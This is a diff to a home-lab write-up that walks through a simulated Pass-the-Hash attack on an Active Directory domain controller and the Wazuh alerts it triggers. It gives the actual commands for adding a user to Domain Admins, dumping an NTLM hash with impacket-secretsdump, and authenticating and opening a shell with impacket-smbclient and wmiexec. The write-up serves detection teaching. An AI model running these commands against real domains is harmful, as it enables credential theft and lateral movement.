@@ -8,7 +8,7 @@
 
 > *"When I first encountered Pass-the-Hash, I got stuck on a fundamental question: **'If an attacker doesn't crack the password, where does the hash come from? Don't they need the password first to get the hash?'**"*
 
-This is one of the most common cognitive hurdles in Active Directory security. Here is the lightbulb breakthrough that made it click:
+This is one of the most common cognitive hurdles in Active Directory security. Here is the lightbulb breakthrough that makes it click:
 
 ### 1. The Hash Reversal Fallacy
 - **The Misconception:** Attackers find a password $\rightarrow$ calculate the hash $\rightarrow$ pass the hash. *(If they had the password, why not just login directly?)*
@@ -103,6 +103,8 @@ When an adversary uses Pass-the-Hash, the Windows Security Event Log records **E
 
 ## Phase 1: Target Elevation & Privilege Verification
 
+### Step 1: Privilege Escalation — Adding Target Account to Domain Admins
+
 To enable administrative share access (`C$`, `ADMIN$`) and remote execution, `spray-user03` was added to `Domain Admins`:
 
 ```powershell
@@ -112,15 +114,38 @@ Add-ADGroupMember -Identity "Domain Admins" -Members "spray-user03"
 
 ![01 DC Add Domain Admins](images/01_dc_add_spray_user03_to_domain_admins.png)
 
-This immediately triggered Wazuh custom Rule **100105** (Level 10 — Privilege Escalation: Account added to a privileged group) on **Event ID 4728**:
+---
+
+### Step 2: SIEM Detection — Wazuh Rule 100105 Level 10 Alert (Privilege Escalation)
+
+The group modification immediately triggered custom Wazuh Rule **100105** (Level 10 — "Account added to a privileged group (possible privilege escalation)") on Event 4728:
 
 ![02 Wazuh Rule 100105 Privilege Escalation](images/02_wazuh_rule_100105_privilege_escalation_domain_admins.png)
+
+---
+
+### Step 3: Forensic Document Details — Event 4728 Group Membership Changes
+
+Inspecting Document Details for Event 4728 provides full audit visibility into the privilege escalation:
+- **`data.win.eventdata.memberName`:** `CN=spray-user03,CN=Users,DC=soclab,DC=local`
+- **`data.win.eventdata.targetUserName`:** `Domain Admins`
+- **`data.win.eventdata.subjectUserName`:** `administrator`
+
 ![03 Wazuh Event 4728 Document Details](images/03_wazuh_event_4728_document_details_group_membership.png)
+
+---
+
+### Step 4: Event Telemetry — Event 4728 Security Message Crop
+
+The event message text confirms the security identifier and target group mapping:
+
 ![04 Wazuh Event 4728 Security Message](images/04_wazuh_event_4728_security_message_privilege_escalation.png)
 
 ---
 
 ## Phase 2: Credential Access (Harvesting the NTLM Hash)
+
+### Step 5: Credential Harvesting — Extracting NTLM Hash via DRSUAPI (secretsdump)
 
 Before lateral movement can occur, the adversary must obtain the NTLM hash. In this simulated test, `impacket-secretsdump` was executed via the DRSUAPI RPC interface to extract `spray-user03`'s database record:
 
@@ -128,7 +153,7 @@ Before lateral movement can occur, the adversary must obtain the NTLM hash. In t
 impacket-secretsdump -just-dc-user spray-user03 soclab.local/Administrator:'[REDACTED]'@192.168.100.146
 ```
 
-### Extracted Record:
+#### Extracted Record:
 ```text
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -143,7 +168,7 @@ soclab.local\spray-user03:1148:aad3b435b51404eeaad3b435b51404ee:[REDACTED_NTLM_H
 
 ## Phase 3: Lateral Movement via Pass-the-Hash
 
-### 1. Direct Administrative SMB Mount (`impacket-smbclient`)
+### Step 6: Lateral Movement — Pass-the-Hash SMB Authentication (impacket-smbclient)
 
 The adversary supplies solely the NTLM hash using the `-hashes :<NTHASH>` syntax:
 
@@ -151,7 +176,14 @@ The adversary supplies solely the NTLM hash using the `-hashes :<NTHASH>` syntax
 impacket-smbclient -hashes :[REDACTED_HASH] soclab.local/spray-user03@192.168.100.146
 ```
 
-Inside the interactive SMB shell:
+![06 Kali SMBClient Initial Auth](images/06_kali_smbclient_pass_the_hash_initial_auth.png)
+
+---
+
+### Step 7: Administrative Access — Traversal of C$ Administrative Share
+
+Inside the interactive SMB shell, the administrative share is mounted and traversed:
+
 ```text
 # shares
 ADMIN$
@@ -163,12 +195,13 @@ SYSVOL
 # ls
 ```
 
-![06 Kali SMBClient Initial Auth](images/06_kali_smbclient_pass_the_hash_initial_auth.png)
 ![07 Kali SMBClient C Drive Mounted](images/07_kali_smbclient_pass_the_hash_c_drive_mounted.png)
 
 Full traversal of the Domain Controller's file system (`Windows`, `Program Files`, `pagefile.sys`, `SecretData`, `secpol.txt`) was achieved without entering a password.
 
-### 2. Semi-Interactive Command Execution (`impacket-wmiexec`)
+---
+
+### Step 8: Remote Command Execution — Spawning Administrative Shell via WMI (wmiexec)
 
 To validate administrative control, a remote command shell was spawned over WMI (TCP port 135/445):
 
@@ -192,23 +225,27 @@ C:\> exit
 
 ## Phase 4: Blue Team Telemetry & Detection Engineering
 
-### Telemetry Isolation: Proof of NTLM Exclusivity
+### Step 9: Telemetry Isolation — Proof of Zero Kerberos KDC Interaction (Event 4768)
 
-A search for **Event ID 4768** (Kerberos TGT Request) for `spray-user03` during the attack window yielded **0 hits**:
+A search for **Event ID 4768** (Kerberos TGT Request) for `spray-user03` during the attack window yielded **0 hits** (the only hits belong to the Domain Controller computer account `WIN-SOCLAB$`):
 
 ![09 Wazuh Event 4768 Isolation Proof](images/09_wazuh_event_4768_no_kerberos_tgt_proof_ntlm_isolation.png)
 
 This proves that Pass-the-Hash **completely bypassed the Kerberos Key Distribution Center (Port 88)**, operating exclusively over SMB/RPC via NTLM.
 
-### Detection Alert: Wazuh Rule 100115 (Level 12)
+---
+
+### Step 10: Primary SIEM Alert — Wazuh Rule 100115 Level 12 (Off-Hours Network Logon)
 
 Because the attack occurred off-hours (`23:33`), custom Rule **100115** generated 8 consecutive **Level 12 Critical Alerts**:
 
 ![10 Wazuh Rule 100115 Off-Hours Alert](images/10_wazuh_rule_100115_off_hours_logon_type3_level12_alert.png)
 
-### The Forensic Smoking Gun: Event 4624 Details
+---
 
-Inspecting the underlying Windows Security Event 4624 confirms the signature of Pass-the-Hash:
+### Step 11: Forensic Smoking Gun — Event 4624 Telemetry (LogonProcessName: NtLmSsp)
+
+The underlying Windows Security Event 4624 confirms the signature of Pass-the-Hash:
 
 ```yaml
 EventID: 4624
@@ -225,6 +262,13 @@ Source Network Address: 192.168.100.50  # Attacker IP
 ```
 
 ![11 Wazuh Event 4624 Smoking Gun](images/11_wazuh_event_4624_ntlmssp_smoking_gun_evidence.png)
+
+---
+
+### Step 12: Forensic Document Details — Comprehensive NTLM Telemetry Fields
+
+Opening Document Details in Wazuh verifies all NTLM authentication parameters:
+
 ![12 Wazuh Event 4624 Document Details](images/12_wazuh_event_4624_document_details_ntlm_telemetry.png)
 
 ---
